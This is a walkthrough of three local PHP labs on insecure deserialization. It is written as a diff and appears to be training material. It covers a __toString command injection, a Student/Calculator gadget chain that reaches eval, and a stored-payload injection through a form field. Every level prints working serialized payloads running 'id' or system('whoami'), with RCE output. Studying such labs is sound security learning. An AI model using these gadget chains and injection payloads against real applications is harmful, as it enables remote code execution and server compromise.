@@ -1,0 +1,260 @@
+[Level 1]
+
+[*] Target: http://localhost:25001
+
+    - If you are looking at this lab's source code and thinking "What the hack is this?", it is just a composer
+
+    - A composer is a dependency manager for PHP, and a composer.json file is used to define the dependencies 
+      just like a docker file which can be used to install things that are necessary for the PHP project and the downloaded stuff will be put to /vendor 
+
+    => Because of that, we don't need to care about /vendor yet
+
+    - So you already farmilier with __construct & __destruct, this time we gonna focus on __toString()
+
+    // [?] You may know that __toString() is activated when the object is proccessed as a string
+
+    - As you can see in the router.php, we have
+
+            ...
+            public function __toString()
+            {
+                return system("ping " . $this->host);
+            }
+            ...
+    
+    - And in the /templates/table.php
+
+        <?php 
+            foreach ($_SESSION["students"] as $idx => $student)
+                // Duyệt qua từng học sinh và in thông tin ra màn hình
+                echo <<<EOF
+                    <tr>
+                        <th scope="row">{$idx}</th>{$student}
+                    </tr>
+                EOF;
+        ?>
+
+    => With the condition satisfied, we can execute __toString() in Router, just like the way we did in map 4 of the Pokemon game
+
+        O:6:"Router":1:{s:4:"host";s:4:"; id";}
+
+    - However if you just load that without some adjustments, it just prints out your payload like an ID cause
+
+        case 'load':
+            $data = file_get_contents($_FILES["data"]["tmp_name"]);
+            $students_data = explode("|", $data);
+            $students = array();
+            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
+                $key = $students_data[$idx];
+                $value = $students_data[$idx + 1];
+                $value = unserialize($value);
+                $students[$key] = $value;
+                $_SESSION["students"] = $students;
+            }
+
+        => Basically, {$idx} separate with {$student} by '|', and if you don't do that, the code will think our payload is {$idx} and __toString() can't be activated
+
+    => 0|O:6:"Router":1:{s:4:"host";s:4:"; id";}
+
+    [Final Result: RCE] uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:25002
+
+    - In the index.php of this lab, we can see this
+
+        foreach (glob("libs/*.php") as $filename) {
+            // Không include file router.php
+            if ($filename !== "libs/router.php")
+                include($filename);
+        }
+
+    => So, even though router.php existed, we were still not able to use the trick in the previous lab
+
+    - And look at what I found in the student.php
+
+            class Student
+            {
+                public $name;
+                public $age;
+                public $exam;
+                public function __construct($name, $age)
+                {
+                    $this->name = $name;
+                    $this->age = $age;
+                }
+                    public function __toString()
+                {
+                    return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>"; // [?] This stuff will be printed out in the $student 
+                }
+                ...
+                public function get_point()
+                {
+                    if (isset($this->exam))
+                        return $this->exam->get_result();
+                    return "N/A";
+                }
+            }
+
+    => It's normal, right? But it's just normal when you haven't looked at Calculator class in utils.php
+
+            class Calculator
+            {
+                public $expression;
+                public function __construct($expr)
+                {
+                    $this->expression = $expr;
+                }
+
+                public function get_result()
+                {
+                    $result = eval($this->expression);
+                    return $result;
+                }
+            }
+    
+    => So we can redirect get_result() function from Student to Calculator
+
+    - And this is the serialized stuff when we download the sav file 
+
+        0|O:7:"Student":3:{s:4:"name";s:15:"Hung Thinh Tran";s:3:"age";s:2:"20";s:4:"exam";N;}|
+        1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:3:"121";s:4:"exam";N;}|
+
+    // [?] N stands for null, and the exam in this case also needs a lot of other stuff since this is a hidden class which even not included in index.php
+
+    - Now, we need to fix things to pass the value to the exam
+
+            <?php
+
+            class Calculator
+            {
+                public $expression;
+                public function __construct($expr)
+                {
+                    $this->expression = $expr;
+                }
+
+                public function get_result()
+                {
+                    $result = eval($this->expression);
+                    return $result;
+                }
+            }
+
+            class Exam{...}
+
+            class Student
+            {
+
+                public $name;
+                public $age;
+                public $exam;
+                public function __construct($name, $age, $exam)
+                {
+                    $this->name = $name;
+                    $this->age = $age;
+                    $this->exam = $exam;
+                }
+
+                public function __toString()
+                {
+                    return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
+                }
+                ...
+                public function get_point()
+                {
+                    if (isset($this->exam))
+                        return $this->exam->get_result();
+                    return "N/A";
+                }
+            }
+
+            $step1 = new Calculator("system('whoami');");
+            $step2 = new Student("name","age",$step1);
+            $payload = serialize($step2);
+            echo $payload;
+
+    => O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}
+
+    => Now the exam is set, which is the necessary condition to activate get_point() in the Student class
+
+    - Fix the payload a little bit because it still uses explode() like the way it did in the previous lab
+
+    => 0|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|
+
+    [Final Result: RCE] www-data
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:25003
+
+    - This lab is kinda different from the others since there is no place for you to neither download sav files nor upload your payload
+
+    - Look at the safe-save-load.php
+
+            ...
+
+            foreach ($_SESSION["students"] as $key => $student)
+                $message = $message . $key . "|" . serialize($student) . "|";
+            file_put_contents("/usr/save_files/" . session_id(), $message);
+            echo "Saved";
+
+            ...
+
+            $data = file_get_contents("/usr/save_files/" . session_id());
+            $students_data = explode("|", $data);
+            $students = array();
+            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
+                $key = $students_data[$idx];
+                $value = $students_data[$idx + 1];
+                $value = unserialize($value);
+                $students[$key] = $value;
+                $_SESSION["students"] = $students;
+            }
+            echo "Loaded";
+
+            ... 
+    
+    - Now this lab saves the data stuff in /usr/save_files/{your session id} and also they load stuff from that
+
+    - For example, when I saved my stuff
+
+            #	Name	            Age	    Point
+            0	Hung Thinh Tran	    20	    N/A
+            1	Shadow Boxer	    20	    N/A 
+    
+        => root@321b988a5bc5:/usr/save_files# cat 4ad217c2c80114e73a352af2bc7798a1
+
+            0|O:7:"Student":3:{s:4:"name";s:15:"Hung Thinh Tran";s:3:"age";s:2:"20";s:4:"exam";N;}|
+            1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:2:"20";s:4:"exam";N;}|
+
+    - Use the logic of an HTML hacker, I can do this 
+
+        1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:2:"20";s:4:"exam";N;}|{index}|{my payload}|";s:2:"20";s:4:"exam";N;}|
+
+    => This means that the next student you insert into your workshop will look like
+
+        name: Emotional Damage
+        age: 20";s:4:"exam";N;}|3|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|
+
+    // [?] I can use the payload from the previous lab because the only thing changed is the save and load file
+
+        => root@321b988a5bc5:/usr/save_files# cat 4ad217c2c80114e73a352af2bc7798a1
+
+        0|O:7:"Student":3:{s:4:"name";s:15:"Hung Thinh Tran";s:3:"age";s:2:"20";s:4:"exam";N;}|
+        1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:2:"20";s:4:"exam";N;}|
+        |b:0;|2|O:7:"Student":3:{s:4:"name";s:16:"Emotional Damage";s:3:"age";s:158:"20";s:4:"exam";N;}|
+        3|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|";s:4:"exam";N;}|
+
+    => After entering the age for Emotional Damage, you press "Load Student" to unserialize the value
+
+    [Final Result: RCE] www-data
